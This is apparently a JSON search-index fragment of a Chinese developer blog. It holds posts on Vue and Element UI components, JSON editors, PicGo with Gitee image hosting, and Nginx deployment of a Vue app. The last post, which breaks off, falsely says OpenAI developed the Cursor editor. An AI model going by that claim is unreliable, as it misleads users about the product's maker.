非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/02/12/%E3%80%90VsCode%E3%80%91VsCode%E4%B8%AD%E7%9A%84HTML%E5%B5%8C%E5%A5%97%E6%B3%A8%E9%87%8A%E3%80%81%E5%A4%9A%E8%A1%8C%E6%B3%A8%E9%87%8A%E3%80%81%E5%A4%9A%E7%BA%A7%E6%B3%A8%E9%87%8A%EF%BC%8C%E6%8F%90%E9%AB%98%E7%94%9F%E4%BA%A7%E5%8A%9B/"},{"title":"Typora使用gitee作为图库用picgo上传图片的教程~","text":"# 前言 这一年，写的博客也多，总是需要插入图片的，图片存在本地的话上传到博客网站去就没法显示了，就算一个图一个图的复制粘贴上去，想移植到其他的博客网站，图就会失效，为了解决这个问题，这篇文章就诞生了！ 首先，还是一如既往的推荐别人是怎么搞的！ 参考文章如下： 《Typora 上传图片到 CSDN——PicGo + Gitee (码云) 实现 markdown 免费图床 —— 开局第一篇》 《markdown 笔记神器 Typora 如何上传图片？（图床功能） 《一文教你用 Typora + Gitee (码云) + PicGo 实现 云 markdown 笔记》 # 环境配置预览 安装 nodejs：https://nodejs.org/en/ Gitee 账户：https://gitee.com/ Typora 软件:https://www.typora.io/#windows PicGo:https://molunerfinn.com/PicGo/ # 01. 安装 nodejs 请百度自行安装，不过多介绍 node 和 npm 环境检测： 12345C:\\&gt;node -vv14.16.0C:\\&gt;npm -v6.14.11 # 02.Gitee 账户配置 # 新建仓库 # 私人令牌 token 配置获取 找到 设置 -&gt; 安全设置 -&gt; 私人令牌 ，点击生成新令牌 选择下面的选项即可！ 点击提交，账户安全验证即可 保存后面生成的私人令牌 gitee 配置到此完毕！ # 03.PicGo 配置 # 插件安装 # 插件配置 # 上传尝试 这里，您可以随便截图一张，剪贴板图片上传试试效果 图片放大看看，本文的图片是不是就在下面这里！哈哈哈！ # 04.Typora 配置 说实话，写这篇文章，就是想用到 markdown 自动上传图片，自动同步图片到各个平台！ 废话不多说，建议直接和博主配置一样就行！ # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/08/20/%E3%80%90Typora%E3%80%91typora%E9%85%8D%E7%BD%AEAliCloudOss%E5%9B%BE%E5%BA%93%E4%BD%BF%E7%94%A8picgo%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87/"},{"title":"【Vue】JSON编辑器Bin-Coder","text":"# 【Vue】JSON 编辑器 Bin-Coder Bin Code Editor # 1 安装 # 1.1 CDN 安装 123456&lt;!-- import Vue.js --&gt;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue&quot;&gt;&lt;/script&gt;&lt;!-- import stylesheet --&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;https://unpkg.com/bin-code-editor@0.1.0/lib/styles/index.css&quot;&gt;&lt;!-- import bin-code-editor --&gt;&lt;script src=&quot;https://unpkg.com/bin-code-editor@0.1.0/lib/bin-code-editor.min.js&quot;&gt;&lt;/script&gt; @0.1.0 表示版本号，我们建议锁定版本号来保证代码的稳定性 # 1.2 npm 安装 推荐使用 npm 安装，它能更好地和 webpack 打包工具配合使用。而且可以更好的和 es6 配合使用。并且支持按需引入 123npm i bin-code-editor -S# or yarn add bin-code-editor # 2 引入 在 main.js 中写入以下内容： 1234567891011import Vue from 'vue';import CodeEditor from 'bin-code-editor';import 'bin-code-editor/lib/style/index.css';import App from './App.vue';Vue.use(CodeEditor);new Vue({ el: '#app', render: h =&gt; h(App)}); # 3 用法 注意，初始化如果有数据，则会默认格式化一次，格式化快捷键默认为 F7, 使用时可以进行格式化结构！ 12JSON.stringify(JSON.parse(jsonData),null,2)`可以将默认json进行预格式化,也可以手动触发formatCode()来格式化`JSON.stringify(value[, replacer[, space]]) 参数说明： value: 必需， 要转换的 JavaScript 值（通常为对象或数组）。 replacer: 可选。用于转换结果的函数或数组。如果 replacer 为函数，则 JSON.stringify 将调用该函数，并传入每个成员的键和值。使用返回值而不是原始值。如果此函数返回 undefined，则排除成员。根对象的键是一个空字符串：“”。如果 replacer 是一个数组，则仅转换该数组中具有键值的成员。成员的转换顺序与键在数组中的顺序一样。 space: 可选，文本添加缩进、空格和换行符，如果 space 是一个数字，则返回值文本在每个级别缩进指定数目的空格，如果 space 大于 10，则文本缩进 10 个空格。space 也可以使用非数字，如：\\t。 12345678910111213141516&lt;template&gt;&lt;div&gt; &lt;b-code-editor v-model=&quot;jsonStr&quot; :indent-unit=&quot;4&quot; height=&quot;auto&quot;/&gt;&lt;/div&gt;&lt;/template&gt;&lt;script&gt; const jsonData = `{&quot;title&quot;:&quot;测试json数据&quot;,&quot;children&quot;:[{&quot;name&quot;:&quot;子项名称&quot;, &quot;desc&quot;:&quot;子项说明&quot; },{&quot;name&quot;:&quot;子项名称1&quot;, &quot;desc&quot;:&quot;子项说明1&quot; }]}` export default { data() { return { jsonStr: jsonData } } }&lt;/script&gt; # 4 其他配置项 参数 说明 类型 可选值 默认值 value 绑定数据，可用 v-model String — 0 show-number 显示行号 Boolean — true mode 模式 String ‘application/json’,‘text/javascript’ ‘application/json’ theme 提供若干个默认比较好看的皮肤 String 可选值参考其他配置项中列出 idea lint 是否进行 lint 检查 Boolean 暂时只支持 json true readonly 只读模式 Boolean - false auto-format 是否自动格式化 Boolean - true indent-unit 缩进字符 Number - 2 smart-indent 是否自动缩进 Boolean - true line-wrap 代码换行 Boolean - true gutter 代码折叠 Boolean - true height 默认编辑器高度 String — 300px # 5 Events 事件 123456&lt;template&gt; &lt;div&gt; &lt;b-code-editor v-model=&quot;jsonStr&quot; :indent-unit=&quot;4&quot; height=&quot;auto&quot;/&gt; &lt;p&gt;&lt;b-button @click=&quot;$refs['editor'].formatCode()&quot;&gt;手动触发格式化&lt;/b-button&gt;&lt;/p&gt; &lt;/div&gt;&lt;/template&gt; 事件名 说明 返回值 on-change 输入项改变事件 value formatCode 手动触发格式化方法 - refresh 手动刷新方法 - getValue 自行获取值 - # 6 theme 皮肤属性 theme 属性可选值 idea eclipse duotone-light mdn-like xq-light dracula rubyblue monokai material material-darker # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/01/02/%E3%80%90Vue%E3%80%91JSON%E7%BC%96%E8%BE%91%E5%99%A8Bin-Coder/"},{"title":"【Vue】Element UI el-tag 根据不同状态的数据展示不同颜色的标签","text":"# 【Vue】Element UI el-tag 根据不同状态的数据展示不同颜色的标签 # Element UI 根据不同状态的数据展示不同颜色的标签 展示标签可以使用 el-tag，不同的数据可以使用三目运算进行管控 代码如下： 1234&lt;el-tag :type=&quot;(scope.row.auditstatus == '0' ? '' : (scope.row.auditstatus == '1' ? 'success' : (scope.row.auditstatus == '2' ? 'danger' : (scope.row.auditstatus == '3' ? 'warning' : 'danger'))))&quot; size=&quot;mini&quot;&gt; {{ scope.row.auditstatus == '0' ? '初始值' : (scope.row.auditstatus == '1' ? '审核通过' : (scope.row.auditstatus == '2' ? '审核不通过' : (scope.row.auditstatus == '3' ? '待审核' : '删除'))) }}&lt;/el-tag&gt;123 效果图如下： # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/09/17/%E3%80%90Vue%E3%80%91Element%20UI%20el-tag%20%E6%A0%B9%E6%8D%AE%E4%B8%8D%E5%90%8C%E7%8A%B6%E6%80%81%E7%9A%84%E6%95%B0%E6%8D%AE%E5%B1%95%E7%A4%BA%E4%B8%8D%E5%90%8C%E9%A2%9C%E8%89%B2%E7%9A%84%E6%A0%87%E7%AD%BE/"},{"title":"Linux服务器下部署vue 2.0项目","text":"# 一、安装 VUE 环境 1.wget 指定进行下载，下载后文件默认存在根目录下的 root 包下面； 1wget https://nodejs.org/dist/v16.14.0/node-v16.14.0-linux-x64.tar.xz 解压缩 123xz -d node-v16.14.0-linux-x64.tar.xz #将xz格式解压为tartar -xvf node-v16.14.0-linux-x64.tar #将tar解压为文件 重命名文件夹 12mv node-v16.14.0-linux-x64 nodeJS-V16.14.0 配置 node.js 环境变量 1vim /etc/profile 进入编辑，在文件最下面加上如下字段 12export NODEJS_HOME=/root/nodeJS-V16.14.0export PATH=$NODEJS_HOME/bin:$PATH 个人比较喜欢用 Xftp 将 profile 文件传输到 windows 系统下进行配置后再覆盖回去 配置完成后使用 source 命令重新执行刚修改的初始化文件，使之立即生效，而不必注销并重新登录 1source /etc/profile 检查环境变量是否配置成功 1node -v 安装 WebPackage 1npm install webpack -g --registry=https://registry.npm.taobao.org # 二、Nginx 环境搭建配置 wget 指定进行下载，下载后文件默认存在根目录下的 root 下面； 11.wget https://nginx.org/download/nginx-1.21.6.tar.gz 解压缩 1tar -zxvf nginx-1.21.6.tar.gz 进入 nginx 文件夹 1cd /root/nginx-1.21.6 检查配置 1./configure 安装 gcc 环境，有就不需要安装了 1yum install gcc-c++ 安装 PCRE 依赖库 1yum install -y pcre pcre-devel 安装 zlib 依赖库 1yum install -y zlib zlib-devel 安装 OpenSSL 安全套接字层密码库 1yum install -y openssl openssl-devel 再次执行配置检查命令 12./configure 编译安装 nginx 1make install 查找默认安装路径 1whereis nginx 配置 nginx 环境变量 1vim /etc/profile 进入编辑，在文件最下面加上如下字段 1export PATH=$PATH:/usr/local/nginx/sbin 个人比较喜欢用 Xftp 将 profile 文件传输到 windows 系统下进行配置后再覆盖回去 初始化配置 1source /etc/profile 检查环境变量是否配置成功 1nginx -v 启动 nginx 1nginx 查看 nginx 是否启动，远程访问服务器，跳出 nginx 欢迎界面就算配置成功了！ nginx 常用命令 1234567启动服务：nginx退出服务：nginx -s quit强制关闭服务：nginx -s stop重载服务：nginx -s reload （重载服务配置文件，类似于重启，但服务不会中止）验证配置文件：nginx -t使用配置文件：nginx -c &quot;配置文件路径&quot;使用帮助：nginx -h # 三、发布 VUE 项目 # 打包 VUE 项目 1. 首先配置好线上环境的路径：prod.env 12345module.exports = { NODE_ENV: '&quot;production&quot;', ENV_CONFIG: '&quot;prod&quot;', MANAGEMENT_SERVICE_API: '&quot;http://42.193.125.92:7815&quot;',} 2. 控制台输入 npm run build:prod 3. 打包完会生成一个 dist 文件夹 4. 将 dist 文件夹内容覆盖到 /usr/local/nginx/html 目录下面 5. 修改 nginx 配置 1/usr/local/nginx/conf/nginx.conf 编辑打开 12345678910111213141516171819202122232425262728293031worker_processes 1;events { worker_connections 1024;}http { include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server { listen 8099; #配置当前服务端口 server_name localhost; #配置当前服务IP location / { root html/dist; #配置服务根目录 index index.html index.htm; #配置服务索引页面 } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } }} 6. 重启或关闭重开 Nginx 1234567nginx -s reload #重启nginx -s stop #强制停止nginx #开启 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/04/20/%E3%80%90Vue%E3%80%91Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2VUE%E9%A1%B9%E7%9B%AE/"},{"title":"Vue的生命周期","text":"看过很多人讲 vue 的生命周期，但总是被绕的云里雾里，尤其是自学的同学，可能 js 的基础也不是太牢固，听起来更是吃力，那我就已个人之浅见，以大白话的方式给大家梳理一下，如有不准确的地方，欢迎指正！🤞🤞 # 什么是生命周期？ 生命周期，以个人之浅见，即一个事物从诞生到消亡的一个过程！ 以人的一生来做类比，其实就可以简单粗暴的将生命周期看作人的一生，人这一出生就开始了一段美好（艰难）的旅程，一生中每个成长的阶段都会对应的去做每个阶段该做的事，比如，上幼儿园，小学，中学，高中，大学，工作（比如我就在辛苦的码字），结婚等等直到百年以后，尘归尘，土归土，这就是人的生命周期！ vue 也有这样的一个生命周期，也会在执行到每个阶段做一些事情，不同的是 vue 在每个对应的阶段是通过生命周期函数去做的，此刻再去看一下 vue 官网对生命周期的描述就好理解多了！ vue 官网的描述： 每个 Vue 实例在被创建时都要经过一系列的初始化过程 —— 例如，需要设置数据监听、编译模板、将实例挂载到 DOM 并在数据变化时更新 DOM 等。同时在这个过程中也会运行一些叫做生命周期钩子的函数，这给了用户在不同阶段添加自己的代码的机会。 简单来说就是： 在 Vue 从创建实例到最终完全消亡的过程中，会执行一系列的方法，用于对应当前 Vue 的状态，这些方法我们叫它：生命周期钩子！ 来看我给大家找的一张图，可以保存起来，等待后学学习使用的深入，再看这张图： 根据上图可知，vue 的生命周期一共有 8 个钩子函数，这 8 个函数描绘了一个 vue 的一生，下来我们详细来看看这 8 个生命周期函数，以便更好的理解 Vue 的生命周期！ # vue 的 8 个生命周期函数 配合上图观看 beforeCreate：在实例初始化之后，数据观测 (Data Observer) 和 event/watcher 事件配置之前被调用。 created：在实例创建完成后被立即调用。在这一步，实例已完成以下的配置：数据观测 (data observer)、属性和方法的运算，watch/event 事件回调；然而，挂载阶段还没开始，$el 属性目前不可见。 beforeMount：在挂载开始之前被调用，相关的 render 函数首次被调用。 mounted：el 被新创建的 vm.$el 替换，并挂载到实例上去之后调用该钩子。 如果 root 实例挂载了一个文档内元素，当 mounted 被调用时 vm.$el 也在文档内（PS：注意 mounted 不会承诺所有的子组件也都一起被挂载。 如果你希望等到整个视图都渲染完毕，可以用 vm.$nextTick 替换掉 mounted： , vm.$nextTick 会在后面的篇幅详细讲解，这里大家需要知道有这个东西。 beforeUpdate：数据更新时调用，发生在虚拟 DOM 打补丁之前。这里适合在更新之前访问现有的 DOM，比如手动移除已添加的事件监听器。 updated：由于数据更改导致的虚拟 DOM 重新渲染和打补丁，在这之后会调用该钩子。当这个钩子被调用时，组件 DOM 已经更新，所以现在可以执行依赖于 DOM 的操作，然而在大多数情况下，你应该避免在此期间更改状态。如果要相应状态改变，通常最好使用计算属性或 watcher 取而代之（PS：计算属性与 watcher 会在后面的篇幅中进行介绍）。 beforeDestroy：实例销毁之前调用，在这一步，实例仍然完全可用。 destroyed：Vue 实例销毁后调用。调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。 # 代码验证： 下面的例子我故意将生命周期钩子函数的顺序打乱，并编号，但它还是会自动按照执行顺序输出，就可以验证其上图中的流程，你也手动试试吧！ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;div id=&quot;app&quot;&gt; &lt;button @click=&quot;clickCounter()&quot;&gt;点击&lt;/button&gt; &lt;p&gt;{{ count }}&lt;/p&gt;&lt;/div&gt; &lt;script type=&quot;text/javascript&quot;&gt; var app = new Vue({ el: '#app', data:{ count: 1 }, methods:{ clickCounter(){ this.count += 1 } }, created: function(){ console.log('2. 实例已经创建') }, beforeCreate: function(){ console.log('1. 实例初始化') }, mounted:function(){ console.log('4. 挂载到实例') }, beforeMount:function(){ console.log('3. 挂载开始之前') }, beforeUpdate: () =&gt; { console.log('数据更新时调用') }, updated:function(){ console.log('更新数据重新渲染DOM') }, beforeDestroy:function(){ console.log('实例销毁之前调用') }, destroyed:function(){ console.log('实例销毁之后调用') } }) /*点击页面销毁vue对象, 销毁之后实例将会释放*/ // 销毁之后,再次点击就不起作用了 document.onclick=function(){ app.$destroy(); }; &lt;/script&gt;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748 注意： 最后我手动将这个实例销毁了，点击之后执行一次，后边再点击就不起作用了，测试的时候先把销毁代码端注释掉，然后再放开，进行测试！ # 3 个关于 vue 组件的生命周期钩子 activated：keep-alive 组件激活时调用（PS：与组件相关，关于 keep-alive 会在讲解组件时介绍）。 deactivated：keep-alive 组件停用时调用（PS：与组件相关，关于 keep-alive 会在讲解组件时介绍）。 errorCaptured ：当捕获一个来自子孙组件的错误时被调用，此钩子会收到三个参数：错误对象、发生错误的组件实例以及一个包含错误来源信息的字符串，此钩子可以返回 false 以阻止该错误继续向上传播。 # 写在最后 生命周期这块知识点，在这一块我们只需要有所了解，对其大概使用有个基本的掌握，等待学习的深入以及理解的深入，在回过头来看着一块的内容，结合 Vue 的源码去看会收获良多！ # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/09/15/%E3%80%90Vue%E3%80%91Vue%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/"},{"title":"【Vue】el-upload限制只上传一张图片并隐藏右侧的上传区域","text":"# 【Vue】el-upload 限制只上传一张图片并隐藏右侧的上传区域 使用 element UI 中的 el-upload 如何限制上传一张图片后隐藏右侧的上传区域 主要代码块： 1234567891011121314监听事件watch: { onChangeImgUrl: { handler(newName) { var aa = document.querySelector('.el-upload--picture-card') if (newName) { aa.style.display = 'none' } else { setTimeout(() =&gt; { aa.style.display = 'inline-block' }, 1100) } } } 原理： 因为只上传一张图片，监听图片的 url 即可。听过监听图片的 url 存在与否，通过获取 dom 元素设置不同的样式。 以下完整代码实现如下效果: 12345678910111213141516171819202122232425262728293031父组件setBank.vue&lt;template&gt; &lt;div class=&quot;setBank&quot;&gt; &lt;el-button type=&quot;primary&quot; @click=&quot;addInfo&quot;&gt;入驻&lt;/el-button&gt; &lt;el-dialog :visible.sync=&quot;checkDialogVisible&quot; title=&quot;入驻&quot;&gt; &lt;Upload /&gt; &lt;/el-dialog&gt; &lt;/div&gt;&lt;/template&gt; &lt;script&gt;import Upload from './upload.vue'export default { components: { Upload }, data() { return { checkDialogVisible: false } }, methods: { // 入驻 addInfo() { this.checkDialogVisible = true } }}&lt;/script&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106子组件 upload.vue&lt;template&gt; &lt;div class=&quot;con_form&quot;&gt; &lt;el-form ref=&quot;addForm&quot; :model=&quot;addForm&quot; class=&quot;demo-comCreditForm&quot; label-width=&quot;200px&quot;&gt; &lt;el-form-item label=&quot;企业名称：&quot; prop=&quot;name&quot;&gt; &lt;el-input v-model=&quot;addForm.name&quot; placeholder=&quot;转贷机构名称&quot; /&gt; &lt;/el-form-item&gt; &lt;el-form-item label=&quot;统一社会信用代码：&quot; prop=&quot;code&quot;&gt; &lt;el-input v-model=&quot;addForm.code&quot; placeholder=&quot;请输入统一社会信用代码&quot; /&gt; &lt;/el-form-item&gt; &lt;div class=&quot;upload_icon&quot;&gt; &lt;el-form-item label=&quot;上传：&quot; prop=&quot;addForm&quot;&gt; &lt;el-upload :auto-upload=&quot;false&quot; :limit=&quot;limitCount&quot; :on-remove=&quot;handleRemove&quot; :on-change=&quot;onChange&quot; :on-success=&quot;handleSuccess&quot; :file-list=&quot;fileList&quot; :data=&quot;uploadData&quot; :before-upload=&quot;beforeAvatarUpload&quot; action=&quot;#&quot; class=&quot;avatar-uploader&quot; list-type=&quot;picture-card&quot; accept=&quot;image/jpg,image/jpeg,image/png&quot;&gt; &lt;img v-if=&quot;url&quot; :src=&quot;url&quot; class=&quot;el-upload-list__item-thumbnail&quot;&gt;&lt;/img&gt; &lt;i v-else slot=&quot;default&quot; class=&quot;el-icon-plus&quot; /&gt; &lt;/el-upload&gt; &lt;div class=&quot;el-upload__tip&quot;&gt;jpg.jpeg、png格式，大小5M以内&lt;/div&gt; &lt;/el-form-item&gt; &lt;/div&gt; &lt;/el-form&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt;export default { data() { return { limitCount: 1, url: '', onChangeImgUrl: '', uploadData: { name: 'testFile' }, fileList: [], // 申请入驻银行 表单 addForm: { name: '', code: '' // 社会信用代码 } } }, watch: { onChangeImgUrl: { handler(newName) { var aa = document.querySelector('.el-upload--picture-card') if (newName) { aa.style.display = 'none' } else { setTimeout(() =&gt; { aa.style.display = 'inline-block' }, 1100) } } } }, methods: { onChange(file, fileList) { this.onChangeImgUrl = file.url }, handleRemove(file, fileList) { this.onChangeImgUrl = '' }, handleSuccess(file, fileList) { this.$set(this.myForm, 'netTgThumbnail', fileList.response.bean.result.fileUrlPath) }, // 限制图片大小 beforeAvatarUpload(file) { const isLt5M = file.size / 1024 / 1024 &lt; 5 if (!isLt5M) { this.$message.error('上传头像图片大小不能超过 2MB!') } return isLt5M } }}&lt;/script&gt; &lt;style scoped lang=&quot;scss&quot;&gt;/deep/.upload_icon .el-form-item__content { position: relative; height: 190px;}.avatar-uploader { width: 145px; height: 145px; position: absolute; left: 0; top: 0;}.con_form .upload_icon .el-form-item__content .el-upload__tip { position: absolute; left: 0; bottom: 0; color: red;}&lt;/style&gt; # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/03/15/%E3%80%90Vue%E3%80%91el-upload%E9%99%90%E5%88%B6%E5%8F%AA%E4%B8%8A%E4%BC%A0%E4%B8%80%E5%BC%A0%E5%9B%BE%E7%89%87%E5%B9%B6%E9%9A%90%E8%97%8F%E5%8F%B3%E4%BE%A7%E7%9A%84%E4%B8%8A%E4%BC%A0%E5%8C%BA%E5%9F%9F/"},{"title":"【Vue】vue-json-editor json编辑器.md","text":"# 【Vue】vue-json-editor json 编辑器.md # 一、概述 现有一个 vue 项目，需要一个 json 编辑器，能够格式化 json 数据，同时也支持编辑功能。 vue-json-editor 插件就可以实现这个功能 # 二、vue-json-editor 使用 # 安装插件 1npm install vue-json-editor --save # 使用 test.vue 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283&lt;template&gt; &lt;div style=&quot;width: 70%;margin-left: 30px;margin-top: 30px;&quot;&gt; &lt;vue-json-editor v-model=&quot;resultInfo&quot; :showBtns=&quot;false&quot; :mode=&quot;'code'&quot; @json-change=&quot;onJsonChange&quot; @json-save=&quot;onJsonSave&quot; @has-error=&quot;onError&quot; /&gt; &lt;br&gt; &lt;el-button type=&quot;primary&quot; @click=&quot;checkJson&quot;&gt;确定&lt;/el-button&gt; &lt;/div&gt;&lt;/template&gt; &lt;script&gt; // 导入模块 import vueJsonEditor from 'vue-json-editor' export default { // 注册组件 components: { vueJsonEditor }, data() { return { hasJsonFlag:true, // json是否验证通过 // json数据 resultInfo: { 'employees': [ { 'firstName': 'Bill', 'lastName': 'Gates' }, { 'firstName': 'George', 'lastName': 'Bush' }, { 'firstName': 'Thomas', 'lastName': 'Carter' } ] } } }, mounted: function() { }, methods: { onJsonChange (value) { // console.log('更改value:', value); // 实时保存 this.onJsonSave(value) }, onJsonSave (value) { // console.log('保存value:', value); this.resultInfo = value this.hasJsonFlag = true }, onError(value) { // console.log(&quot;json错误了value:&quot;, value); this.hasJsonFlag = false }, // 检查json checkJson(){ if (this.hasJsonFlag == false){ // console.log(&quot;json验证失败&quot;) // this.$message.error(&quot;json验证失败&quot;) alert(&quot;json验证失败&quot;) return false } else { // console.log(&quot;json验证成功&quot;) // this.$message.success(&quot;json验证成功&quot;) alert(&quot;json验证成功&quot;) return true } }, } }&lt;/script&gt; &lt;style&gt;&lt;/style&gt; 插件参数说明： 123456789&lt;vue-json-editor v-model=&quot;resultInfo&quot; // 绑定数据resultInfo :showBtns=&quot;false&quot; // 是否显示保存按钮 :mode=&quot;'code'&quot; // 默认编辑模式 // 显示中文，默认英文 @json-change=&quot;onJsonChange&quot; // 数据改变事件 @json-save=&quot;onJsonSave&quot; // 数据保存事件 @has-error=&quot;onError&quot; // 数据错误事件 /&gt; 相关说明： resultInfo 默认绑定的变量，这个变量可以为空，编辑器会显示为 {} :showBtns 这里不显示保存按钮，为什么呢？原因有 2 个。1. 默认样式不好看。2. 只能当 json 数据正确，才能点击保存按钮，否则禁止点击。 json-change，json-save，has-error 这 3 个事件，是会实时触发的。 这里我额外加了一个检测方法，用来判断 json 数据是否正确。默认标记为 true，当不正确时，会改变状态为 false。 # 访问 点击确定，提示成功 改为错误的，点击确定，会提示失败。 注意：这个 json 编辑会带有下来菜单，实际项目中，需要去除，比较用户误操作。 在实际使用中发现几个问题： \\1. 输入中文时，传给后端的值不多 \\2. 输入大量 json 时，会有部分数据丢失。 因此，我们使用下面的编辑器 bin-code-editor # 三、bin-code-editor # 安装模块 1npm install bin-code-editor -d # 引入 在 main.js 中写入 2 行 12import CodeEditor from 'bin-code-editor';Vue.use(CodeEditor); test.vue 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;template&gt; &lt;div style=&quot;width: 70%;margin-left: 30px;margin-top: 30px;&quot;&gt; &lt;b-code-editor v-model=&quot;jsonStr&quot; :auto-format=&quot;true&quot; :smart-indent=&quot;true&quot; theme=&quot;dracula&quot; :indent-unit=&quot;4&quot; :line-wrap=&quot;false&quot; ref=&quot;editor&quot;&gt;&lt;/b-code-editor&gt; &lt;br&gt; &lt;el-button type=&quot;primary&quot; @click=&quot;onSubumit&quot;&gt;提交&lt;/el-button&gt; &lt;/div&gt;&lt;/template&gt; &lt;script&gt; const jsonData =`{ &quot;employees&quot;: [{ &quot;firstName&quot;: &quot;Bill&quot;, &quot;lastName&quot;: &quot;Gates&quot; }, { &quot;firstName&quot;: &quot;George&quot;, &quot;lastName&quot;: &quot;Bush&quot; }, { &quot;firstName&quot;: &quot;Thomas&quot;, &quot;lastName&quot;: &quot;Carter&quot; }] }` export default { data() { return { jsonStr:jsonData } }, methods: { // 检测json格式 isJSON(str) { if (typeof str == 'string') { try { var obj=JSON.parse(str); if(typeof obj == 'object' &amp;&amp; obj ){ return true; }else{ return false; } } catch(e) { return false; } }else if (typeof str == 'object' &amp;&amp; str) { return true; } }, onSubumit(){ if (!this.isJSON(this.jsonStr)){ this.$message.error(`json格式错误`) return false } this.$message.success('json格式正确') } } }&lt;/script&gt; &lt;style&gt; &lt;/style&gt; 访问测试页面，效果如下： 输入错误的值，点击执行，会有提示 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/04/02/%E3%80%90Vue%E3%80%91vue-json-editor%20json%E7%BC%96%E8%BE%91%E5%99%A8/"},{"title":"【Vue】修复element可搜索下拉框选中选项，切屏后，会自动获取焦点，菜单自动弹出","text":"# 【Vue】修复 element 可搜索下拉框选中选项，切屏后，会自动获取焦点，菜单自动弹出 # 1. 添加自定义指令 v-select-blur # 在 main.js 添加： 1234567891011121314Vue.directive('select-blur', { bind(el, binding) { let inputDom = el.getElementsByTagName('input')[0] if (!inputDom) return let isOpen = false inputDom.addEventListener('focus', function (event) { if (isOpen) { inputDom.blur() } else { isOpen = true } }) }}) # 用法： 123456789101112131415&lt;el-select v-select-blur v-model=&quot;value&quot; :placeholder=&quot;请选择&quot; clearable filterable&gt; &lt;el-option v-for=&quot;item in countryList&quot; :key=&quot;item.id&quot; :label=&quot;item.name&quot; :value=&quot;item.name&quot; :title=&quot;item.name&quot; /&gt;&lt;/el-select&gt; # 存在的问题： ​ 虽然有效，但是会导致第二次点下拉框时，无法继续搜索 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/04/24/%E3%80%90Vue%E3%80%91%E4%BF%AE%E5%A4%8Delement%E5%8F%AF%E6%90%9C%E7%B4%A2%E4%B8%8B%E6%8B%89%E6%A1%86%E9%80%89%E4%B8%AD%E9%80%89%E9%A1%B9%EF%BC%8C%E5%88%87%E5%B1%8F%E5%90%8E%EF%BC%8C%E4%BC%9A%E8%87%AA%E5%8A%A8%E8%8E%B7%E5%8F%96%E7%84%A6%E7%82%B9%EF%BC%8C%E8%8F%9C%E5%8D%95%E8%87%AA%E5%8A%A8%E5%BC%B9%E5%87%BA/"},{"title":"充满可能的新一代辅助编程神器：Cursor","text":"# 【ChatGPT】充满可能的新一代辅助编程神器：Cursor # 随着技术的不断进步，人工智能已经逐渐成为了编程领域中不可或缺的一部分。而今天我们要为大家介绍的，就是一款基于 GPT4 智能引擎，由 OpenAI 开发出来的全新辅助编程神器 — Cursor。 # 1、Cursor 编辑器 Cursor 作为一款智能代码编辑器，为程序员们提供了惊人的编程体验。它支持多种常见编程语言，可以轻松的处理各种程序代码，同时还支持多种文件类型和格式化文本，让编辑代码变得更加轻松和舒适。除此之外，Cursor 还拥有许多强大的辅助功能，例如多种主题、多语言语法高亮，在编辑代码时可以根据不同的语言给出不同的颜色提示，让代码阅读变得更加清晰明了。同时，Cursor 还支持快捷键设置、代码折叠、括号匹配、自动缩进等功能，这让程序员们不仅可以在编写代码时更快捷地完成任务，同时也让整个编写过程变得更加高效，透彻地展现出 “智能、便捷、高效” 等的特性。总之，如果你正在寻找一款能够让你的编程体验更加高效、便捷、舒适的工具，那么 Cursor 绝对是一个不错的选择。无论是初学者还是已经经验丰富的程序员们，都可以从中得到惊人的帮助，成为更加专业和出色的编程专家。 # 2、Cursor 下载 可以直接官方网站下载：www.cursor.so/ 我这里也整理了最新 Mac 和 Windows 版本，提供网盘下载： 